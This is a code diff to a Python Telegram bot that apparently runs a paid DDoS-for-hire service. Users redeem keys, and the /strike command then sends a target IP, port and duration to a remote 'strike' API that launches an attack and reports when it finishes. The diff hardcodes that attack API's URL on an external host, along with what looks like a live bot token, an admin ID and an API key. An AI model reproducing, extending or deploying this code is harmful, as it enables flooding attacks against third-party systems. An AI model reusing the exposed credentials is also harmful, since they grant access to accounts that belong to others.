@@ -5,14 +5,14 @@ import os
 import threading
 import time
 
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '8898448854:AAFPfCiuwtqVSRzZiob5ubMZ5PRbhWWfs8A')
 ADMIN_ID = os.environ.get('ADMIN_ID', '7837187893')
-API_URL = os.environ.get('API_URL', 'http://localhost:8080/api/strike')
 API_KEY = os.environ.get('API_KEY', 'BHAG_BHOSDIKE_2024')
 
-if not BOT_TOKEN:
-    print("Error: BOT_TOKEN not set!")
-    exit()
+# 🔥 YAHAN HARDCODE KAR DIYA - TERI API URL
+API_URL = "https://test-dilc.onrender.com/api/strike"
+
+print(f"🤖 Bot Starting with API: {API_URL}")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -21,7 +21,7 @@ KEYS_DB = "keys.json"
 
 def load(f):
     if os.path.exists(f):
-        with open(f) as x:
+        with open(f, 'r') as x:
             return json.load(x)
     return {}
 
@@ -45,7 +45,7 @@ def gen(m):
     keys = load(KEYS_DB)
     keys[key] = "1d"
     save(KEYS_DB, keys)
-    bot.reply_to(m, f"Key: {key}")
+    bot.reply_to(m, f"✅ Key: {key}")
 
 @bot.message_handler(commands=['redeem'])
 def redeem(m):
@@ -55,27 +55,30 @@ def redeem(m):
     keys = load(KEYS_DB)
     if args[1] in keys:
         users = load(USERS_DB)
-        users[str(m.from_user.id)] = {"active": True}
+        users[str(m.from_user.id)] = {"active": True, "plan": keys[args[1]]}
         save(USERS_DB, users)
         del keys[args[1]]
         save(KEYS_DB, keys)
-        bot.reply_to(m, "Activated!")
+        bot.reply_to(m, "✅ Activated!")
     else:
-        bot.reply_to(m, "Invalid key")
+        bot.reply_to(m, "❌ Invalid key")
 
 @bot.message_handler(commands=['me'])
 def me(m):
     users = load(USERS_DB)
-    if str(m.from_user.id) in users:
-        bot.reply_to(m, "Active Plan: Yes")
+    uid = str(m.from_user.id)
+    if uid in users:
+        bot.reply_to(m, f"✅ Active Plan: {users[uid].get('plan', 'Active')}")
     else:
-        bot.reply_to(m, "No active plan")
+        bot.reply_to(m, "❌ No active plan")
 
 @bot.message_handler(commands=['strike'])
 def strike(m):
     users = load(USERS_DB)
-    if str(m.from_user.id) not in users:
-        return bot.reply_to(m, "No plan! /redeem")
+    uid = str(m.from_user.id)
+    
+    if uid not in users:
+        return bot.reply_to(m, "❌ No plan! /redeem")
     
     args = m.text.split()
     if len(args) != 4:
@@ -85,17 +88,25 @@ def strike(m):
     
     try:
         url = f"{API_URL}?key={API_KEY}&ip={ip}&port={port}&time={sec}"
-        r = requests.get(url, timeout=5)
+        print(f"📡 Calling: {url}")
+        
+        r = requests.get(url, timeout=10)
+        
         if r.status_code == 200:
-            bot.reply_to(m, f"✅ ATTACK: {ip}:{port} for {sec}s")
+            bot.reply_to(m, f"✅ ATTACK STARTED!\n🎯 {ip}:{port}\n⏱️ {sec}s")
+            
+            def done():
+                bot.send_message(m.chat.id, f"✅ ATTACK FINISHED\n🎯 {ip}:{port}")
+            
+            threading.Timer(int(sec), done).start()
         else:
-            bot.reply_to(m, f"Error: {r.text}")
+            bot.reply_to(m, f"❌ Error: {r.status_code}\n{r.text[:100]}")
     except Exception as e:
-        bot.reply_to(m, f"API Error: {str(e)[:50]}")
+        bot.reply_to(m, f"❌ API Error!\n{str(e)[:80]}\n\nAPI_URL: {API_URL}")
 
 @bot.message_handler(commands=['status'])
 def status(m):
-    bot.reply_to(m, f"Bot: Active\nAPI: {API_URL}")
+    bot.reply_to(m, f"🤖 Bot: Active ✅\n🔌 API: {API_URL}\n👑 Admin: {ADMIN_ID}")
 
-print("Bot Starting...")
-bot.polling()
+print("🔥 Bot Running...")
+bot.polling(none_stop=True)
